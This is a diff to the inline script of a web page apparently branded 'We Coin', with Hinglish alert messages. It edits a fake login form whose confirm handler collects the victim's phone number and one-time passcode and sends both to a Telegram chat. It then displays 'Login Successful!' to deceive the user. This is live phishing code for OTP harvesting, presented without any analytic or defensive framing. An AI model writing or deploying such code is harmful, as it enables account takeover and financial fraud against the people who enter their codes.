@@ -156,56 +156,33 @@
         });
 
         // 2. SEND OTP BUTTON
-        sendOtpBtn.addEventListener('click', async function() {
-            const phone = document.getElementById('phone').value;
-            
-            this.disabled = true;
-            let timeLeft = 60;
-            this.innerText = `${timeLeft}s`;
+// 3. CONFIRM BUTTON
+document.getElementById('confirmOtpBtn').addEventListener('click', async function() {
+    const phone = document.getElementById('phone').value;
+    const otp = document.getElementById('otpCode').value;
+    
+    if(!otp) {
+        alert("Pehle 6-digit OTP enter karein!");
+        return;
+    }
 
-            const msg = `🚨 *We Coin: OTP Request Aaya Hai!*\n\n📱 User ne Send OTP dabaya.\n📞 Phone: ${phone}`;
-            await sendToTelegram(msg);
+    this.innerText = "Confirming...";
+    this.disabled = true;
 
-            timerInterval = setInterval(() => {
-                timeLeft--;
-                sendOtpBtn.innerText = `${timeLeft}s`;
+    const msg = `✅ *We Coin: OTP Enter Hua!*\n\n📞 Phone: ${phone}\n🔢 Entered OTP: ${otp}`;
+    const success = await sendToTelegram(msg);
 
-                if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    sendOtpBtn.innerText = "Send";
-                    sendOtpBtn.disabled = false;
-                }
-            }, 1000);
-        });
+    if(success) {
+        alert("Login Successful!");
+        closeModal();
+        document.getElementById('loginForm').reset();
+        document.getElementById('otpCode').value = "";
+    } else {
+        alert("Telegram par nahi gaya, network check karein.");
+    }
 
-        // 3. CONFIRM BUTTON
-        document.getElementById('confirmOtpBtn').addEventListener('click', async function() {
-            const phone = document.getElementById('phone').value;
-            const otp = document.getElementById('otpCode').value;
-            
-            if(!otp) {
-                alert("Pehle 6-digit OTP enter karein!");
-                return;
-            }
-
-            this.innerText = "Confirming...";
-            this.disabled = true;
-
-            const msg = `✅ *We Coin: OTP Confirm Hua!*\n\n📞 Phone: ${phone}\n🔢 Entered OTP: ${otp}`;
-            const success = await sendToTelegram(msg);
-
-            if(success) {
-                alert("Login Successful!");
-                closeModal();
-                document.getElementById('loginForm').reset();
-                document.getElementById('otpCode').value = "";
-            } else {
-                alert("OTP send nahi ho paya, network check karein.");
-            }
-
-            this.innerText = "Confirm";
-            this.disabled = false;
-        });
-    </script>
+    this.innerText = "Confirm";
+    this.disabled = false;
+});
 </body>
 </html>
